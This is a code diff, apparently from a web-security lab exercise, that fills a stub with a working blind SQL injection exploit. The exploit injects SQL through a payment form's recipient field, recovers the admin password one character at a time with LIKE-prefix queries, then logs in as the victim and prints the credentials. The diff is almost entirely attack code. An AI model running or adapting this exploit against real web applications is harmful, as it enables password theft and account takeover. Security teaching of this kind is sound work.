@@ -18,13 +18,27 @@ def submit_pay_form(sess, recipient, amount):
                     data={
                         "recipient": recipient,
                         "amount": amount,
+                        "_csrf": sess.cookies.get_dict()["session"]
                     })
     return response.status_code == codes.ok
 
 def sqli_attack(username):
     sess = Session()
     assert(submit_login_form(sess, "attacker", "attacker"))
-    pass
+    password = ""
+    found = False
+    while not found:  # attacker' AND users.password like 'c%
+        for c in "abcdefghijklmnopqrstuvwxyz":
+            if password and submit_pay_form(sess, f"{username}' AND users.password='{password}", 1):
+                found = True
+                break
+            if submit_pay_form(sess, f"{username}' AND users.password like '{password + c}%", 1):
+                password += c
+                print(password)
+    
+    assert(submit_login_form(sess, username, password))
+    print(username, password)
+    return password
 
 def main():
     sqli_attack("admin")
